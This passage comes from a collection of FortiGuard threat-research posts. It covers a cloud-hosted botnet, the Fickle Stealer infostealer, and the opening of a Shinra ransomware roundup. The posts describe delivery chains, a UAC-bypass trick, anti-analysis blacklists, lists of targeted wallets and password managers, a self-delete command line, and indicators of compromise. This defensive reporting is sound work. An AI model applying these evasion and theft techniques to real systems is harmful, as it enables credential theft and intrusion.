from its C2 server. FortiGuard Labspreviously disclosedthe Condi DDoS botnet, which continues to exploit CVE-2023-1389 to gain control of devices and execute its malicious activities. The binary file is hosted on “45[.]128[.]232[.]90” for distribution. Once a device is infected, the malware kills off the competition and specific processes. It then sets up a connection to a central Command and Control (C2) server, “trembolone[.]zapto[.]org.” FortiGuard Labs noticed the incident as the payload “ping -c 20 209.141.35.56,” which seemed unusual within such an attack. Since the IP address is neither the attack source nor the destination intranet, we suppose these two IP addresses, 45[.]128[.]232[.]229 and 209[.]141[.]35[.]56, might be controlled by the attacker simultaneously and one of them is a command and control (C2) server. The attack source IP address, “45[.]128[.]232[.]229,” has four files named “msgbox.exe,” “udp,” “udparm,” and “udpmips,” respectively. These are DoS tools for different Linux architectures, except “msgbox.exe,” which pops up a message box with the string “RAT.” The following analysis examines the “udp” file. The tool has an unmistakable usage message, “Usage: %s <IP> <SECONDS> [PORT],” while executing without any arguments. When executing with the necessary “IP” and “SECONDS” arguments, the tool triggers a UDP flooding DoS attack using system-generated random characters. The IP address “209[.]141[.]35[.]56” pinged by the compromised device is exploited by the attack source IP address “45[.]128[.]232[.]229” using the CVE-2023-1389 vulnerability. It was first met with a page that the FBI has seized due to its use as a DDoS service (Figure 12). However, FortiGuard Labs found the IP address also has another route, “hxxp://209[.]141[.]35[.]56/getters/,” which contains 19 malware variants for different Linux architectures. (see Figure 13) aarch64 microblazebe aarch64be microblazeel arcle-750d mips arcle-hs38 mipsel armv4l nios2 armv5l openrisc armv6l powerpc armv7l riscv64 i586 sh4 m68k sparc m68k-68xxx x86_64-core-i7 m68k-coldfire x86-core2 m68k-coldfire.gdb x86-i686 xtensa-lx60 Figure 13: The malware for different Linux architectures We focus on analyzing the file for architecture “x86-i686.” The malware creates a socket and checks whether the C2 server is valid. If not, it terminates the program. If the server is confirmed reachable, the malware sets up a connection with C2 server “45[.]128[.]232[.]229,” which is the exploit CVE-2023-1389 source IP address, executes the “ps” command, and gathers process-related output information. The malware executes the command “ps -eo pid,comm --no-headers” through “/bin/bash” to get all process PIDs (Process IDs) and command names running without a header line. It then leverages the obtained PIDs (Process IDs) to further check the commands of those executing processes using “/proc/<PID>/comm.” Afterward, the malware sends related information to the C2 server. According to our analysis, the attackers seem to have a cloud command and control (C2) server (45[.]128[.]232[.]229) and a network-attached malware storage (209[.]141[.]35[.]56). The attacker first checks to see if the leveraged device can reach the network-attached malware storage to download malware and execute the following attack stages. This malware, which we named “Skibidi,” was spread by the attacker using two different vulnerabilities simultaneously. One is CVE-2023-1389 in TP-Link Archer AX21, which botnets have continuously exploited since it was launched, asdetailed in the reportproduced by FortiGuard Lab. The other is CVE-2024-21887 in Ivanti Connect Secure, which caused a sensation in April 2024. Attackers first download the “Skibidi” malware with a downloader script. It downloads and executes each malware to determine the proper Linux architecture attack. arm4 mips arm5 mipsel arm6 ppc arm7 sh4 x86_64 Figure 21: The malware targets Linux architectures The following analysis is based on the malware “skibidi.x86_64.” While executing the malware, it displays the string “youre not skibidi enough.” It then calls the Linux function “ptrace” to handle the process on the victim host. The malware sends signals like a debugger to the sub-program, the malware itself, to fork another process to evade detection. The malware then decodes strings encoded by XOR for the behaviors creating process and popping up execution result string. It calls the system function “prctl,” which manipulates the calling process by naming it with the XOR-encoded strings “-bash” and “x86_64.” Afterward, the malware tries to connect with its C2 server through a socket. Meanwhile, it uses the system call “select” to listen to the events of files the attacker is interested in, such as process events. The malware repeats these steps of listening to events and sends the results back to the server. Cloud services' inherent flexibility and efficiency have unwittingly provided cybercriminals with a new arena for their activities. This shift to cloud-based operations marks a significant evolution in the threat landscape, with malware operators exploiting these platforms' advantages. Organizations must bolster their cloud security defenses as botnets and DDoS tools continue to leverage cloud services. Robust security measures and vigilant monitoring within cloud environments are imperative to combat these sophisticated attacks. Implementing a multi-layered security approach, including regular patching, updates, and network segmentation, is essential to isolate critical assets and mitigate potential breaches. The malware described in this report is detected and blocked by FortiGuard Antivirus as: BASH/Mirai.AEH!tr.dldr ELF/Gafgyt.ST!tr ELF/Mirai.CDB!tr ELF/Mirai.CEA!tr ELF/Mirai.CPD!tr ELF/Mirai.OX!tr ELF/Skibidi.CQC!tr ELF/UDPFlooder.1C8B!tr ELF/UDPFlooder.1EE7!tr ELF/UDPFlooder.E063!tr Linux/Mirai.CPD!tr Linux/Mirai.REAL!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard Web Filtering Service blocks the C2 servers and downloads URLs. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: CVE-2016-20016: JAWS.DVR.CCTV.Shell.Unauthenticated.Command.Execution CVE-2017-17215: Huawei.HG532.Remote.Code.Execution CVE-2018-10561: Dasan.GPON.Remote.Code.Execution CVE-2018-10562: Dasan.GPON.Remote.Code.Execution CVE-2023-1389: TP-Link.Archer.AX21.Unauthenticated.Command.Injection CVE-2024-21887: Ivanti.Connect.Secure.Policy.Secure.Authentication.Bypass We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. 45[.]128[.]232[.]15 45[.]128[.]232[.]90 45[.]128[.]232[.]229 45[.]128[.]232[.]234 hxxp://45[.]128[.]232[.]15 hxxp://45[.]128[.]232[.]90 hxxp://45[.]128[.]232[.]229 hxxp://209[.]141[.]35[.]56/getters hxxp://45[.]128[.]232[.]234 d5e81e9575dcdbbaa038a5b9251531d8beccedc93bd7d250a4bb2389c1615cd6 6226e896850de8c5550b63481b138067582ebf361f7c5448d9d0596062150d89 4c2dcd13685f24800b73856d1f3ec9a2c53c2b5480a9c10b73035a43df26c2e8 31914b317ba6a44a9d3acb99979ec8c163bef8667b0ae41524e335847d70afb0 5fbfc4c8204309e911d22d3b544773f8d4f9ab2edc71f8967bbdcce6cbc834ca 53daa1e4c2f5c11a75989334c2a0227689509606aeda9d7ab11dd200ee6138c6 a9690df4542f28fc4e3b9161b9f8d685d4ce8753bfd9b1f5c8aacd6aa4bef873 fb86bb0863d15ac65a916979052220f755765eb0d5bc4c1c47e34762738d2311 cd05eaa2b01ec1a4880839628d1c6e3bed9045478cacbfb88f14d1937ccf667b c88da56b348f8d89b5ab99a710de7131bdbc2f1dba4bb9809b1b3fd27322630e 83a2608a93b643f68ab3dcfccf8de7b13394cc214a78fa59b6867e47fc56928c 3660fbe90420f60664e68859de918a5c592dd33024f69bebff8bb77ab41b8fca 75b594a20110e487e35ec4590a5211a425119cdf0fea6fcf030ee20cb548b7e5 ef2e57a5992d85ea2bfb5c5645f8b361dcd5c49eede38185a7b99ec00c287550 2e69d9942a4c0d6d0294d038263f2d12f3a5f6aef8d72279b01e025d32addab2 1a8508f62447e5ee624866b571a29cedc369d6ee8182782f32a75dcd58494d8c 305e0eb9b815dddd40d73f4464946a0ec21866b7727e4fe073692bf82bb46936 0092b27bee2df9536e8aff8948a1007ed1eb03f0e12e0348b72a113e7d4cb585 65f2850892365a4d6bafc303ed04379bef3b41a85336e274f9348603105d2f37 c569eb7f33dcec3e6cdcfee7195202813fda6b7bf9ecb786a4a909d6745cbbff 5110f8af13cdd872b904784d2aec75031c663baad01d68b5f05daa950d18ced3 eec122d6480803bcdd2c6906b0ae35bcffaf6bf5117dac8c7b2621f0b98b68ea 9f14cdea1b41ac1c7251e3f2d4186e12d480d108942bc8f1f7bcac133ed88ccc 5a0a8de050cc8ad2f9af41e4018b0317afc39c571f23bc9cfa115c6558205722 eb9ba3171a98dc543cbc599eb6ab9aa3a5a47cc6931afe511fa839c6a5fb889c 1825c787c308d3cb1125d416025af8c8344a158f0a0b3467df6c0c875d2d8800 eb926f93bdd9b38d44d2239b4ec9c1d45762f850bee80cf9556b23372b6f0639 8fb6110b2114e7786b1d4e7f600a08de0a25432417f863d9663d576a3c895e86 dc87ff82199cb60a8bcf59d4f8c0a706bf10051d0c15a911d37d1cda8fcf5f9e 1816c473ba94f4740c0931e118d038ecb0733f8ffb7cbb74dedc7b78952f8318 d4dbd379f914ff5ba40c1aac1be37602e4cde687e47cfd7793cb10192617f4af d034664f627af11bd2a34ba1b228b5a6841309caabfd72a731bbd4724d947e27 4cc2110f89afac1de0c1989d0af07f8879003cac0803660f37cf394a0027db69 bd42e67e6238dfec0b7786797733c54ae1d92fe0e883758dddea779e113b5271 bd42e67e6238dfec0b7786797733c54ae1d92fe0e883758dddea779e113b5271 e758c4428a590519a281344a31f236146c996c784433fbe82eee009dd922516c 3a3581da268d0fdb8c8027e261b682b07b6715c62fbf2c8aca301b7e8dd9d637 6e21e400928f24630339441f6da0f3f1b66860bf480a9f5af20482878b686189 8363ecc977d426f0e922abbeb4f1e8ed06397c0b6951dd75233016d3b5af58c9 e511f5c8fc0bd713dc9b9742e8c682ba66177bb617e9118f84b150cf6ff4a07f ddcb420c4141760feed2fc8c76425b72ab111d271385040c1446f6ab3993c6d7 2b526e5ac01916d74e7aa88770102a8f34d4c57cea7a4e45c501331670635e26 666eed520d2b430e1016eec555c0cd125912f9a8f7590d77c286eff52416fbaf ba4229f5e44c378ae293b58139233a9bfbecbfd22fb51e05f74de38b186a071c c376db6e6f6905113e7beb1f14d8e5a44b8374a959eefd0f5d25ab0f3cbabee2 ae999de92c369e53a3287ab034f2839367b44f7fd82d6ed56a5700c22ed44635 e94b6b99fae4dc8e5b0796c877ed01bf25f77ccab95fb43d24abed00e0f8a15a 8fcb5c4c5306f3e7ffa2a47dedaddc108c77ef8ef48ec0980a0c441333e0a18b 34f653119e418621c1cbfe7cf0614ea62e9a98dc345e4d7408eea96a08d3ac0d a51333460fb711e0b172b6e4893d5bca6b9996f240b450fdaa5cbf14511c9e27 90a43ca83efb2d460b86ff897b1bc657170b6c79c2c804610cdfca8f24adc71e c5b6320925963ca6d5439dca7154c526c3a26500e204b48ff30a50c3a1b875ad e7d87e68265a9a324d76759cca4f613c28c590b36490c8c65ee3d17918e5d3ec 2867b3fd3c840aa9c868a88a5f6d417a09e4158f8209f0450a07eeb7e99ba4c8 botnets,cloud service providers FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/growing-threat-of-malware-concealed-behind-cloud-services"
  },
  {
    "title": "Fickle Stealer Distributed via Multiple Attack Chain",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High The past few years have seen a significant increase in the number of Rust developers. Rust is a programming language focused on performance and reliability. However, for an attacker, its complicated assembly code is a significant merit. In May 2024, FortiGuard Labs observed a Rust-based stealer. In addition to its intricate code, the stealer is distributed using a variety of strategies and has a flexible way of choosing its target. Because of this ambiguity, we decided to call it Fickle Stealer. This article summarizes the details of this campaign, roughly dividing the attack chain into three stages: Delivery, Preparatory Work, and Packer and Stealer Payload. We are aware of four methods being used to deliver Fickle Stealer: VBA dropper, VBA downloader, link downloader, and executable downloader. For the most part, they download a PowerShell script for preparatory work. The file name is u.ps1 or bypass.ps1—they indicate the same file. In some attack chains, one more file is added between the downloader and u.ps1 The script in the XML file drops Fickle Stealer to the Temp folder and executes it. The second VBA downloader uses forfiles.exe to subvert detections that limit cmd usage. The third downloader uses a trick to indirectly deliver the VBA downloader. In the document, a web browser control that accesses an MSHTML file on the server is embedded in a frame. When the victim enables active content and macro, it reads the MSHTML file and extracts the command from the file. Usually, the WebBrowser.Navigate method is necessary to load a specified URL. However, Word stores the last loaded URL in the document file, and that URL is used if a new one is not provided. In other words, once the URL is loaded, it can be loaded in the next execution even though there is no related macro. Another variant uses this technique to hide the URL (8d3ccfafc39830ee2325170e60a44eca4a24c9c4dd682a84fa60c961a0712316). This section introduces the script files used in this attack. Normal: C:\\Windows \\System32 Fake: C:\\Windows \\System32\\en-US An MSC file, hosted in Microsoft Management Console (MMC), manages the hardware, software, and network components and requires admin rights. Snap-ins provide the interface to the management task and access to the required program and data. The fake WmiMgmt.msc abuses a Shockwave Flash Object from ActiveX control, which opens a web browser by default. The URL for the web browser is set to localhost, and u.ps1 creates HttpListener, which shows a web page when WmiMgmt.msc is executed. The web page contains a script that configures exclusions for Fickle Stealer and then downloads it to be executed. The file path uses a technique called the Mock Trusted Directories Method. When converting a string during an evaluation request process, the trailing space after “Windows” is removed. As a result, the WmiMgmt.msc will be treated as executed from a trusted path. Furthermore, MMC searches the MSC file for local languages. If not found, it tries to find one for en-US, so when Fickle Stealer executes WmiMgmt.msc’s copy, the fake WmiMgmt.msc is executed instead, with elevated authentication and no UAC prompt pops up. Besides the message, tgmes.ps1 sends victim information, including country, city, IP address, OS version, computer name, and user name to the Telegram bot. Fickle Stealer is protected by a packer disguised as a legal executable. It seems that the attacker made the packer by replacing some code of a legal executable with the packer’s code and changing a function called in the initialize routine into the packer’s function. This can frustrate the static analysis. Mimicking various applications makes it difficult to detect the malware using certain detection rules. For example, there is a variant (a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53) whose__cinitfunction in the initialize routine is modified into the packer’s function. In this case, the malicious code is executed before the WinMain function, which is usually the user-provided entry point for a C/C++ GUI application. As a result, people following typical analysis rules may overlook the malicious code. The packer only allocates memory to write the decrypted payload data and then executes it in memory. Initially, Fickle Stealer creates a mutex to prevent a race condition. It then performs a series of anti-analysis checks and exits the process while it is being analyzed. Generally, it shows a fake error message before terminating the process. Below are the anti-analysis techniques used: Query string:SELECT Name FROM Win32_Process Blacklist:tcpview, wireshark, fiddler, procexp, autoit, df5serv, OllyDbg, x64dbg, x32dbg, WinDbg, fakenet32, fakenet64, ProcessHacker, autorunsc, filemon, procmon, regmon, idaq, idaq64, ImmunityDebugger, dumpcap, HookExplorer, ImportREC, PETools, LordPE, SysInspector, proc_analyzer, sysAnalyzer, sniff_hit, joeboxcontrol, joeboxserver, ResourceHacker, Fidder, httpdebugger, PE-bear, die, sample, malware, virus, sandbox, maltest, test, and virustest Blacklist:SbieDll, SxIn, Sf2, snxhk, cmdvrt32 Query string:SELECT * FROM Win32_PortConnectorSELECT * FROM CIM_MemorySELECT * FROM CIM_PhysicalConnectorSELECT * FROM CIM_SlotSELECT * FROM Win32_SMBIOSMemorySELECT * FROM Win32_MemoryArraySELECT * FROM Win32_MemoryDeviceSELECT * FROM Win32_PhysicalMemorySELECT * FROM Win32_CacheMemory Blacklist: (Empty) Query string:SELECT UUID FROM Win32_ComputerSystemProduct Blacklist:7AB5C494-39F5-4941-9163-47F54D6D501603DE0294-0480-05DE-1A06-35070008000911111111-2222-3333-4444-5555555555556F3CA5EC-BEC9-4A4D-8274-11168F640058ADEEEE9E-EF0A-6B84-B14B-B83A54AFC5484C4C4544-0050-3710-8058-CAC04F59344A00000000-0000-0000-0000-AC1F6BD0497200000000-0000-0000-0000-0000000000005BD24D56-789F-8468-7CDC-CAA7222CC12149434D53-0200-9065-2500-65902500E43949434D53-0200-9036-2500-36902500F022777D84B3-88D1-451C-93E4-D235177420A749434D53-0200-9036-2500-369025000C65B1112042-52E8-E25B-3655-6A4F54155DBF00000000-0000-0000-0000-AC1F6BD048FEEB16924B-FB6D-4FA1-8666-17B91F62FB37A15A930C-8251-9645-AF63-E45AD728C20C67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3C7D23342-A5D4-68A1-59AC-CF40F735B36363203342-0EB0-AA1A-4DF5-3FB37DBB067044B94D56-65AB-DC02-86A0-98143A7423BF6608003F-ECE4-494E-B07E-1C4615D1D93CD9142042-8F51-5EFF-D5F8-EE9AE3D1602A49434D53-0200-9036-2500-369025003AF08B4E8278-525C-7343-B825-280AEBCD3BCB4D4DDC94-E06C-44F4-95FE-33A1ADA5AC2779AF5279-16CF-4094-9758-F88A616D81B4FF577B79-782E-0A4D-8568-B35A9B7EB76B Blacklist:Billy, george, Abby, Darrel Jones, John, John Zalinsk, John Doe, SHCtAGa3rm, UV0U6479boGY, 8wjXNBz, WALKER, oxYT3lZggZMK, t3wObOwwaW, uh6PN, sMdVVcp, 06AAy3, mLfaNLLP, JPQlavKFb0Lt0, 7HV8BUt5BIsCZ, aFgxGd9fq4Iv8, Frank, Anna, wdagutilityaccount, WDAGUtilityAccount, hal9th, virus, malware, sandbox, sample, currentuser, emily, hapubws, hong lee, jaakw.q, it-admin, johnson, miller, milozs, microsoft, sand box, and maltest. Next, it creates a new folder in the Temp folder with a random name, drops its copy to the new folder, and executes the copy. The currently running stealer will be terminated, and the copy will finish the remaining work to communicate with the server and send stolen data to the server. If the environment check is passed, Fickle Stealer sends victim information to the server. The server sends a list of target applications and keywords as a response. Fickle Stealer sends all files in folders according to the list. The stolen data is stored in a specific JSON format that has three key-value pairs: { \"name\": \"RB_{Computer name}\",\"title\": {File name},\"body\": {File content} } In this sample, its name contains a string RB and the name of the victim’s computer. In version 1.5.7 (a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53), the string “RB” is changed to “Hold.” The title indicates the data it grabs. It usually contains a tag followed by a file path. The body is base64-encoded file content. After being compressed with the Deflate algorithm, the JSON-formatted data is sent to the server. There are some exceptions. For example, the first packet sent to the server contains the following items, and the title is System.txt. user name, user domain, DNS host name, NetBIOS name, screen resolution, OS version, language, host name, ip address and hardware information: CPU, GPU, Antivirus software, installed application and currently running process The server's response is also in JSON format and has three key-value pairs: status, k, and c. The target list, encrypted using an RC4 algorithm and then base64 encoded, is stored in c. The decryption key for RC4 is stored in k, as the following image shows. There are four kinds of targets: crypto wallets, plugins, file extensions, and partial paths. Below are the targets specified by the server and the way the data is processed: Wallet Sends files in specified folders. The title of data to send has a “wallet::” tag. AtomicWallet, Exodus, JaxxWallet, Electrum, ByteCoin, Ethereum, Guarda, Coinomi, Armory, ZCash Plugin Sends files in specified folders. The title of data to send has a “plugin___” tag. Authenticator, EOSAuthenticator, Bitwarden, KeePassXC, Dashlane, 1Password, NordPass, Keeper, RoboForm, LastPass, BrowserPass, MYKI, Splikity, CommonKey, ZohoVault, NortonPasswordManager, AviraPasswordManager, TrezorPasswordManager, MetaMask, TronLink, BinanceChain, Coin98, iWallet, Wombat, MEWCX, NeoLine, TerraStation, Keplr, Sollet, ICONex, KHC, TezBox, Byone, OneKey, DAppPlay, BitClip, SteemKeychain, NashExtension, HyconLiteClient, ZilPay, LeafWallet, CyanoWallet, CyanoWalletPro, NaboxWallet, PolymeshWallet, NiftyWallet, LiqualityWallet, MathWallet, CoinbaseWallet, CloverWallet, Yoroi, Guarda, EQUALWallet, BitAppWallet, AuroWallet, SaturnWallet, RoninWallet, Exodus, MaiarDeFiWallet, Nami, Eternl, UniSatWallet File extension Searches files with the following extensions in %USERPROFILE% and the sub-folder. The title of data to send has a “grabg::” tag. .txt, .kdbx, .pdf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .odp, wallet.dat Partial path Concatenates %APPDATA% and the following strings and searches log files and ldb files in the Local Storage/leveldb subfolder. The title is “discord_dblist.txt” discordGoogle/Chrome/User Data/DefaultYandex/YandexBrowser/User Data/DefaultMicrosoft/Edge/User Data/DefaultBraveSoftware/Brave-Browser/User Data/DefaultGoogle/Chrome SxS/User DataGoogle/Chrome/User Data/Profile 1Google/Chrome/User Data/Profile 2Google/Chrome/User Data/Profile 3Google/Chrome/User Data/Profile 4Google/Chrome/User Data/Profile 5Google/Chrome/User Data/Profile 6Google/Chrome/User Data/Profile 7Google/Chrome/User Data/Profile 8Google/Chrome/User Data/Profile 9discordcanaryLightcorddiscordptbOpera Software/Opera StableOpera Software/Opera GX StableAmigo/User DataTorch/User DataKometa/User DataOrbitum/User DataCentBrowser/User Data7Star/7Star/User DataSputnik/Sputnik/User DataVivaldi/User Data/DefaultEpic Privacy Browser/User DatauCozMedia/Uran/User Data/DefaultIridium/User Data/Default Additionally, some applications are targets by default. Below are those targets and the way data is processed: Applications Sends files in specified folder to the server. Most often, the tag is the application name in lower case appended by two colons: Anydesk, Ubisoft (tag:uplay::), Steam, Skype, Signal, ICQ, Filezilla, Telegram, Tox, Pidgin, Element Gecko engine browser Searches %APPDATA%, %LOCALAPPDATA% or %USERPROFILE% for these files: logins.json key4.db, keydb (tag: geckologins::) and  cookies.sqlite (tag: geckocookies::) If found, it copies the file to the Temp folder, sends a copy to the server, and deletes the copy. Chromium based browser Searches “os_crypt\" and \"encrypted_key” in the Local state file to get a decryption key. It parses data in Cookies, History, WebData, and Login Data files to obtain sensitive data and sends a summarized result to the server. These files are also copied to the Temp folder before Fickle Stealer reads them. They are later deleted. The title is browser and the data is stored in JSON format. Finally, it sends a screenshot to the server and deletes itself by executing the following command: cmd.exe /c timeout /t 5 & del /f /q {stealer} && exit In addition to some popular applications, this stealer searches sensitive files in parent directories of common installation directories to ensure comprehensive data gathering. It also receives a target list from the server, which makes Fickle Stealer more flexible. Variants receiving an updated list are observed. The frequently updated attack chain also shows that it’s still in development. FortiGuard will continue monitoring malware variants and provide appropriate protections as needed. The malware described in this report is detected and blocked by FortiGuard Antivirus as: W32/InfoStealer.599C!tr VBA/TrojanDownloader.BED9!tr PowerShell/TrojanDownloader.AE38!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. To stay informed and proactively defend against attacks like Fickle Stealer, sign up to receiveOutbreak Alertsfrom Fortinet. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 144[.]208[.]127[.]230 185[.]213[.]208[.]245 138[.]124[.]184[.]210 hxxps:// github[.]com/SkorikJR 1b48ee91e58f319a27f29d4f3bb62e62cac34779ddc3b95a0127e67f2e141e59 ad57cc0508d3550caa65fcb9ee349c4578610970c57a26b7a07a8be4c8b9bed9 8e87ab1bb9870de9de4a7b409ec9baf8cae11deec49a8b7a5f73d0f34bea7e6f 9ffc6a74b88b66dd269d006dec91b8b53d51afd516fe2326c6f9e3ed81d860ae 48e2b9a7b8027bd03ceb611bbfe48a8a09ec6657dd5f2385fc7a75849bb14db1 6f9f65c2a568ca65326b966bcf8d5b7bfb5d8ddea7c258f58b013bc5e079308b 2236ffcf2856d5c9c2dedf180654cf318596614be450f6b24621dc13d7370dbf 8d3ccfafc39830ee2325170e60a44eca4a24c9c4dd682a84fa60c961a0712316 3ad1c2273ee77845117c0f7f55bf0050b0bcea52851d410520a694252b7bb187 7034d351ce835d4905064d2b3f14adb605374a4a6885c23390db9eddd42add86 c6c6304fea3fd6f906e45544b2e5119c24cda295142ed9fafd2ec320f5ff41cc 97e5ac8642f413ba4b272d3cb74cba3e890b7a3f7a7935e6ca58944dbb9bfe54 011992cfa6abaeb71d0bb6fc05f1b5623b5e710c8c711bca961bf99d0e4cae38 5fbd700bd77d3f632ba6ce148281c74a20391a40c7984f108f63a20dc442f8d6 d9dcae235891f206d1baabfcbd79cb80337b5e462adef9516b94efc696b596b7 679e9ba645e17cceeff14be7f5f7dff8582d68eba5712c5928a092e1eec55c84 4d78793719d14f92f5bb9ecc7c2fa9e51c1bf332de26aa7746f35d7e42362db8 d55611fce7fcdd6b49066b194196577ee12bffa98400b724d013fc3a1e254f34 346e18b7ce2e3c3c5412dacdc8034a7566dee12ea0aafc6b82f196dcba2453f8 20e1d7af698e3e2f5092815be1a0415019511da99550fdcc050741f4b47551fa f71069aed94e4b13d70bd9ee7b2a8fc8580c4339aa9ba9d8baf15abf95d6f673 94ee2227696da3049ff67592834b4b6f98186f91e6d1cd1eeec44f24b9df754b 24e44d000a61de06b63b532ef237d9f41aa897f4d9f46f8abaf9e654074a65af a04677fe4ba06b66f698e4969b749174d30477283d97b5eaee16ffeb305d9c0a 7b9e09227b036428a41dd46b6d6e354bb0c3822ce201c1a14d083116916e078d 0494077ac65aa278680002f3b73c61c8896303668c62139a9db5a042923fd0ce 47e4142fa6ab10a2d7dc0423d41f9bdbb3ced0f4fae5c58b673386d11dd8c973 46caee016da4b460f7c242e19a88e8dc7544ded7d2528b0b9e918a7be64b5ceb b05736874d383ed2e8dcc9d392f2c04e0fd545b8880620499d720c44adb18822 bf8b8f964d1c67aee82ad01528423077ef5e6c65de6d95e446c9343868849350 4602d8f9e2150744e89958d813354696abe6800ee55ef70c48db3134e964a13a 70363b97f955e5d30fb8d3a8d2a439303f88707420c05f051f87e0458fdfffc2 62ff72aa8a8c5bccdf6c789952ee054a0d0d479e417fa20ea73a936e17bdf043 5f24168581cdaef32e60a62ba7123917bbe65f2f8410d759f345587eb406be40 effb85aaef61cd8918d66513da1573365be2743ec263be4029a6b827e3ecc1c6 b57caa40f680d468bbf811e798ef9881d6158fb3462dd9bedb4658d17aed44a5 26fa0ccc5c7b7733ee6ffc2c70edef067b6764387ef1b16cb8005f28c34a3d84 f080d7803ce1a1b9dc72da6ddf0dd17e23eb8227c497f09aa7dfd6f3b5be3a66 93db0d88966519e76db4995a3b67ca548e4aa9675806295a790eedf585e0aa2f 9f7591c9d9bc66029e6a341a4fb8828361fc14b1918f9e35506c608359fa1eec e9bc44cf548a70e7285499209973faf44b7374dece1413dfcdc03bf25a6c599c a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53 9ce52929765433ff8bf905764d7b83c4c3fcbefb4f12eabcf16ee3dddcd3759d b7bdb0cc90b11c4738c2af218a1a53e4c65b6c91c6067c224164b8fcfc3eed8c f878a88b7dda1155fe939abe0500e32d5fba34569ca933bccb5603d9e0e96cc0 bfe2d817e20ecff45cc92b7b8f4e1cd0482b48a769940402eaa5b31cbfb9b908 09b47fd0e1fcab827d1a723f9db7e402502ec91e57b7217ed85094abd98bc637 978400108aa16e464b1fbc300bc270bc89193e3c3890d5e9373b3034b592b4da e394f96ee040508063606343b1ad2158e266dcbd8beb3ba4a23936d1957e5ad6 Info stealer,infostealer,info stealer malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fickle-stealer-distributed-via-multiple-attack-chain"
  },
  {
    "title": "Ransomware Roundup – Shinra and Limpopo Ransomware",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Shinra and Limpopo ransomware. Affected platforms:Microsoft Windows, VMWare ESXiImpacted parties:Microsoft Windows and VMWare ESXi UsersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High The Shinra ransomware was first submitted to a publicly available file-scanning service in April 2024. The threat actor steals victims' data before deploying and running its ransomware malware to encrypt files. The ransomware is also designed to delete Volume Shadow Copies to inhibit system recovery. Since threat actors sometimes use the names of subcultural characters and organizations, we wondered if Shinra was borrowed from the criminal corporation in the Final Fantasy 7 game, but unfortunately, we found no such evidence. Information on the infection vector used by the Shinra ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The Shinra ransomware samples were submitted to a publicly available file scanning service from Israel, Poland, Russia, the United Kingdom, and the United States. One of the Shinra ransomware samples (SHA2: 31eec61ed6866e0b4b3d6b26a3a7d65fed040df61062dd468a1f5be8cc709de7) performs the following actions: The Shinra ransomware sample copies itself to the current user's startup folder in the start menu as <ID>.exe, where <ID> is 32 hex characters. It then terminates processes whose names contain any of the following strings: wxServer wxServerView Sqlmangr RAgui supervise Culture Defwatch winword QBW32 QBDBMgr qbupdate axlbridge httpd fdlauncher MsDtSrvr java 360se 360doctor wdswfsafe fdhost GDscan ZhuDongFangYu QBDBMgrN mysqld AutodeskDesktopApp acwebbrowser Creative Cloud Adobe Desktop Service CoreSync Adobe CEF Helper node AdobeIPCBroker sync-taskbar sync-worker InputPersonalization AdobeCollabSync BrCtrlCntr BrCcUxSys SimplyConnectionManager Simply.SystemTrayIcon fbguard fbserver ONENOTEM wsa_service koaly-exp-engine-se It also terminates services whose names contain any of the following strings: wrapper DefWatch ccEvtMgr ccSetMgr SavRoam Sqlservr sqlagent sqladhlp Culserver RTVscan sqlbrowser SQLADHLP QBIDPService Intuit.QuickBooks.FCS QBCFMonitorService msmdsrv tomcat6 zhudongfangyu vmware-usbarbitator64 vmware-converter dbsrv12 dbeng8 MSSQL$MICROSOFT##WID MSSQL$VEEAMSQL2012 SQLAgent$VEEAMSQL2012 SQLBrowser SQLWriter FishbowlMySQL MSSQL$MICROSOFT##WID MySQL57 MSSQL$KAV_CS_ADMIN_KIT MSSQLServerADHelper100 SQLAgent$KAV_CS_ADMIN_KIT msftesql-Exchange MSSQL$MICROSOFT##SSEE MSSQL$SBSMONITORING MS The Shinra ransomware replaces the desktop wallpaper by changing the following registry setting: The ransomware sets the following registry keys: It also uses wevtutil.exe to enumerate and clear Windows logs. The ransomware does not encrypt files with the following extensions: .exe .dll 